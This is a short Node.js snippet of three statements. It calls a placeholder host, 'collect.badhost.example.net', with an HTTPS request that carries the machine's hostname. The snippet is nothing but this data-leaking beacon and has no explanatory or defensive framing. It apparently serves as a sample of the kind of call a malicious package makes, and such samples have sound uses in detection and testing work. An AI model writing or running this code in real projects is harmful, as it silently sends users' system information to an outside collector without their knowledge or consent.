const https = require("https");
const os = require("os");
https.get("https://collect.badhost.example.net/i?h=" + os.hostname());
